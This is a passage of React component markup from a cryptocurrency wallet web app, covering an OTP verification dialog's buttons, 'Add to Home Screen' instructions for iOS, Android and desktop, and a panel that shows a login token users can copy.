              <div className="flex items-start gap-2">
                <AlertTriangle className="h-4 w-4 text-yellow-600 flex-shrink-0 mt-0.5" />
                <p className="text-xs text-yellow-800">
                  <strong>Security Notice:</strong> If you did not request this code, do not enter it. Contact support immediately.
                </p>
              </div>
            </div>
          </div>
          <DialogFooter className="flex gap-2">
            <Button 
              variant="outline" 
              onClick={() => {
                setShowOTPModal(false);
                setOtpCode("");
                setOtpEmail("");
                setPendingSeedPhrase(null);
                localStorage.removeItem("pendingSeedPhrase");
              }} 
              className="flex-1 rounded-xl"
              disabled={isVerifyingOTP}
            >
              Cancel
            </Button>
            <Button 
              onClick={handleVerifyOTP} 
              disabled={otpCode.length !== 6 || isVerifyingOTP || otpTimeLeft === 0}
              className="flex-1 rounded-xl bg-red-500 hover:bg-red-600"
            >
              {isVerifyingOTP ? (
                <>
                  <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                  Verifying...
                </>
              ) : (
                <>
                  <Lock className="mr-2 h-4 w-4" />
                  Verify
                </>
              )}
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      <Dialog open={showMobileModal} onOpenChange={setShowMobileModal}>
        <DialogContent className="w-[calc(100%-2rem)] max-w-sm mx-auto rounded-2xl">
          <DialogHeader className="text-center">
            <div className="flex justify-center mb-4">
              <div className="w-16 h-16 rounded-2xl bg-primary/10 flex items-center justify-center">
                <Smartphone className="h-8 w-8 text-primary" />
              </div>
            </div>
            <DialogTitle className="text-xl">Add to Home Screen</DialogTitle>
            <DialogDescription className="text-sm">
              Add American Coin to your home screen for quick access to your wallet
            </DialogDescription>
          </DialogHeader>
          <div className="py-4 space-y-4">
            <div className="bg-muted/50 rounded-xl p-4 space-y-3">
              <p className="text-sm font-medium text-center mb-3">How to add:</p>
              {isIOS ? (
                <div className="space-y-3 text-sm">
                  <div className="flex items-start gap-3">
                    <div className="w-6 h-6 rounded-full bg-primary/20 flex items-center justify-center flex-shrink-0 text-xs font-bold text-primary">1</div>
                    <p className="text-muted-foreground">Tap the <Share className="inline h-4 w-4" /> Share button at the bottom of Safari</p>
                  </div>
                  <div className="flex items-start gap-3">
                    <div className="w-6 h-6 rounded-full bg-primary/20 flex items-center justify-center flex-shrink-0 text-xs font-bold text-primary">2</div>
                    <p className="text-muted-foreground">Scroll down and tap "Add to Home Screen"</p>
                  </div>
                  <div className="flex items-start gap-3">
                    <div className="w-6 h-6 rounded-full bg-primary/20 flex items-center justify-center flex-shrink-0 text-xs font-bold text-primary">3</div>
                    <p className="text-muted-foreground">Tap "Add" in the top right corner</p>
                  </div>
                </div>
              ) : (
                <div className="space-y-3 text-sm">
                  <div className="flex items-start gap-3">
                    <div className="w-6 h-6 rounded-full bg-primary/20 flex items-center justify-center flex-shrink-0 text-xs font-bold text-primary">1</div>
                    <p className="text-muted-foreground">Tap the <MoreVertical className="inline h-4 w-4" /> menu icon in your browser</p>
                  </div>
                  <div className="flex items-start gap-3">
                    <div className="w-6 h-6 rounded-full bg-primary/20 flex items-center justify-center flex-shrink-0 text-xs font-bold text-primary">2</div>
                    <p className="text-muted-foreground">Tap "Add to Home screen" or "Install app"</p>
                  </div>
                  <div className="flex items-start gap-3">
                    <div className="w-6 h-6 rounded-full bg-primary/20 flex items-center justify-center flex-shrink-0 text-xs font-bold text-primary">3</div>
                    <p className="text-muted-foreground">Tap "Add" to confirm</p>
                  </div>
                </div>
              )}
            </div>
          </div>
          <DialogFooter className="flex gap-2 sm:gap-2">
            <Button 
              variant="outline" 
              onClick={() => {
                setShowMobileModal(false);
                setPendingRedirect(true);
              }} 
              className="flex-1 rounded-xl"
            >
              Skip for now
            </Button>
            <Button 
              onClick={() => {
                setShowMobileModal(false);
                setPendingRedirect(true);
              }}
              className="flex-1 rounded-xl"
            >
              Done
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Add to Home Screen Modal */}
      <Dialog open={showAddToHomeScreenModal} onOpenChange={setShowAddToHomeScreenModal}>
        <DialogContent className="w-[calc(100%-2rem)] max-w-md mx-auto rounded-2xl">
          <DialogHeader className="text-center">
            <div className="flex justify-center mb-4">
              <div className="w-16 h-16 rounded-2xl bg-primary/10 flex items-center justify-center">
                <Smartphone className="h-8 w-8 text-primary" />
              </div>
            </div>
            <DialogTitle className="text-xl">Add to Home Screen</DialogTitle>
            <DialogDescription className="text-sm">
              Add this app to your home screen for quick access
            </DialogDescription>
          </DialogHeader>
          <div className="py-4 space-y-4">
            {/* Instructions based on platform */}
            <div className="space-y-3">
              {isIOS ? (
                <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
                  <h4 className="font-semibold text-blue-900 mb-2 flex items-center gap-2">
                    <Share className="h-4 w-4" />
                    iOS Instructions
                  </h4>
                  <ol className="text-sm text-blue-800 space-y-2 list-decimal list-inside">
                    <li>Tap the Share button <Share className="h-3 w-3 inline" /> at the bottom of your screen</li>
                    <li>Scroll down and tap "Add to Home Screen"</li>
                    <li>Tap "Add" to confirm</li>
                  </ol>
                </div>
              ) : isMobile ? (
                <div className="bg-green-50 border border-green-200 rounded-lg p-4">
                  <h4 className="font-semibold text-green-900 mb-2 flex items-center gap-2">
                    <Share className="h-4 w-4" />
                    Android Instructions
                  </h4>
                  <ol className="text-sm text-green-800 space-y-2 list-decimal list-inside">
                    <li>Tap the menu button <MoreVertical className="h-3 w-3 inline" /> (three dots) in your browser</li>
                    <li>Select "Add to Home screen" or "Install app"</li>
                    <li>Tap "Add" or "Install" to confirm</li>
                  </ol>
                </div>
              ) : (
                <div className="bg-purple-50 border border-purple-200 rounded-lg p-4">
                  <h4 className="font-semibold text-purple-900 mb-2 flex items-center gap-2">
                    <Smartphone className="h-4 w-4" />
                    Desktop Instructions
                  </h4>
                  <p className="text-sm text-purple-800">
                    On desktop, look for the install icon in your browser's address bar, or use the browser menu to install the app.
                  </p>
                </div>
              )}
            </div>

            {/* Login Token Section */}
            {userLoginToken && (
              <div className="space-y-2">
                <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3">
                  <div className="flex items-start gap-2">
                    <Key className="h-5 w-5 text-yellow-600 flex-shrink-0 mt-0.5" />
                    <div className="space-y-1">
                      <p className="text-sm font-semibold text-yellow-800">Save Your Login Token</p>
                      <p className="text-xs text-yellow-700">
                        Copy this token to restore access to your wallet later. You can use it instead of entering your seed phrase.
                      </p>
                    </div>
                  </div>
                </div>
                
                <div className="space-y-2">
                  <Label className="text-sm font-medium">Login Token</Label>
                  <div className="flex items-center gap-2">
                    <Input
                      type="text"
                      value={userLoginToken}
                      readOnly
                      className="rounded-xl font-mono text-sm bg-muted"
                    />
                    <Button
                      onClick={() => {
                        navigator.clipboard.writeText(userLoginToken);
                        setTokenCopied(true);
                        toast({ title: "Copied", description: "Login token copied to clipboard" });
                        setTimeout(() => setTokenCopied(false), 2000);
                      }}
                      size="icon"
                      className="rounded-xl"
                      variant={tokenCopied ? "default" : "outline"}
                    >
                      {tokenCopied ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
                    </Button>
                  </div>
                  <p className="text-xs text-muted-foreground">
                    Use this token in "Restore with Token" option on the landing page to access your wallet.
                  </p>
                </div>
              </div>
            )}

            {/* Info Box */}
            <div className="bg-blue-50 border border-blue-200 rounded-lg p-3">
              <div className="flex items-start gap-2">
                <AlertCircle className="h-5 w-5 text-blue-600 flex-shrink-0 mt-0.5" />
                <div className="space-y-1">
                  <p className="text-sm font-semibold text-blue-800">Benefits of Adding to Home Screen</p>
                  <ul className="text-xs text-blue-700 space-y-1 list-disc list-inside">
                    <li>Quick access without opening your browser</li>
                    <li>App-like experience with full-screen mode</li>
                    <li>Auto-login when you open from home screen</li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
          <DialogFooter>
            <Button 
              onClick={() => {
                setShowAddToHomeScreenModal(false);
                // For mobile, show mobile-specific modal, otherwise redirect
                if (isMobile) {
                  // Small delay to ensure modal closes properly
                  setTimeout(() => {
                    setShowMobileModal(true);
                  }, 100);
                } else {
                  setPendingRedirect(true);
                }
              }} 
              className="flex-1 rounded-xl"
            >
              Got It, Continue to Wallet
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}
